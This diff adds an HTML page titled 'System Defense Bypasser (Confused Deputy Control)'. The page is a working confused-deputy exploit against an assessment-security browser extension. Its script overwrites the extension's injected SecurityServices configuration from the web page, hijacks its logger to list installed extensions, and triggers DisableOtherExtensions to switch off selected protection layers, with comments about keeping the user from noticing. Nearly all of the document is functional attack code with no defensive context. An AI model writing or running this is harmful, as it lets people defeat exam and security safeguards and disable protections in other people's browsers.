@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Assessment Security Control Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 30px; background: #f4f6f9; color: #333; }
+        .container { max-width: 600px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h1 { color: #d9534f; font-size: 22px; }
+        .extension-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; border-bottom: 1px solid #eee; }
+        .switch { position: relative; display: inline-block; width: 50px; height: 24px; }
+        .switch input { opacity: 0; width: 0; height: 0; }
+        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 24px; }
+        .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
+        input:checked + .slider { background-color: #5cb85c; }
+        input:checked + .slider:before { transform: translateX(26px); }
+        button { background: #0275d8; color: white; border: none; padding: 10px 15px; border-radius: 4px; cursor: pointer; font-size: 16px; margin-top: 15px; width: 100%; }
+        button:hover { background: #014c8c; }
+        #status { margin-top: 15px; font-weight: bold; color: #5cb85c; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>System Defense Bypasser (Confused Deputy Control)</h1>
+    <p>Select which extensions you want to <strong>KEEP ALIVE</strong> (Allowed Whitelist). Anything turned off will be forcefully disabled by the extension.</p>
+    
+    <button id="scan-btn">1. Scan Browser for Extensions</button>
+    
+    <div id="extension-list" style="margin-top: 20px;"></div>
+    
+    <button id="apply-btn" style="display:none;">2. Apply Target Strike</button>
+    <div id="status"></div>
+</div>
+
+<script>
+    let discoveredExtensions = [];
+
+    // — PHASE 1: Hooking and Scanning —
+    document.getElementById('scan-btn').addEventListener('click', async () => {
+        const listContainer = document.getElementById('extension-list');
+        listContainer.innerHTML = "Scanning…";
+
+        // 1. Temporarily clear configuration to pull a full inventory
+        if (typeof SecurityServices !== 'undefined') {
+            SecurityServices.securityConfig = { allowedExtensions: [] };
+
+            // 2. Intercept the logger to catch extension definitions as they load
+            SecurityServices.SetLogger(function(message, data) {
+                if (data && data.name && data.id) {
+                    // Check for duplicates
+                    if (!discoveredExtensions.some(ext => ext.id === data.id)) {
+                        discoveredExtensions.push(data);
+                    }
+                }
+            });
+
+            // 3. Trigger the function. It turns everything off, but populates our logger
+            await SecurityServices.DisableOtherExtensions();
+
+            // 4. Instantly restore everything back to normal so the user doesn't panic yet
+            await SecurityServices.ReEnableExtensions();
+
+            // 5. Render the custom toggle switch interface dynamically
+            renderInterface();
+        } else {
+            listContainer.innerHTML = "<span style='color:red;'>Error: SecurityServices object not found. Ensure the extension injected scripts into this page context.</span>";
+        }
+    });
+
+    // — PHASE 2: Creating the Toggles —
+    function renderInterface() {
+        const listContainer = document.getElementById('extension-list');
+        listContainer.innerHTML = "";
+
+        if (discoveredExtensions.length === 0) {
+            listContainer.innerHTML = "No third-party extensions discovered or all are already allowed.";
+            return;
+        }
+
+        discoveredExtensions.forEach(ext => {
+            const item = document.createElement('div');
+            item.className = 'extension-item';
+            item.innerHTML = `
+                <div>
+                    <strong>${ext.name}</strong><br>
+                    <small style="color:#777;">ID: ${ext.id}</small>
+                </div>
+                <label class="switch">
+                    <!– If checked, the extension goes into the whitelist (stays ON) –>
+                    <input type="checkbox" class="ext-toggle" data-id="${ext.id}" checked>
+                    <span class="slider"></span>
+                </label>
+            `;
+            listContainer.appendChild(item);
+        });
+
+        document.getElementById('apply-btn').style.display = "block";
+        document.getElementById('status').innerText = `Scan complete. Found ${discoveredExtensions.length} extensions.`;
+    }
+
+    // — PHASE 3: Executing the Selective Strike —
+    document.getElementById('apply-btn').addEventListener('click', async () => {
+        const toggles = document.querySelectorAll('.ext-toggle');
+        const whitelist = [];
+
+        // Check which toggles the exploit user left enabled
+        toggles.forEach(toggle => {
+            if (toggle.checked) {
+                whitelist.push(toggle.getAttribute('data-id'));
+            }
+        });
+
+        // Rewrite the internal configuration of your extension directly from the web page
+        SecurityServices.securityConfig.allowedExtensions = whitelist;
+
+        document.getElementById('status').innerText = "Applying selective strike…";
+
+        // Force execution a second time with our custom targeted configuration
+        const result = await SecurityServices.DisableOtherExtensions();
+        
+        document.getElementById('status').innerText = `Success! Disabled ${result.disabled.length} targeted protection layers.`;
+        console.log("Disabled items:", result.disabled);
+    });
+</script>
+
+</body>
+</html>
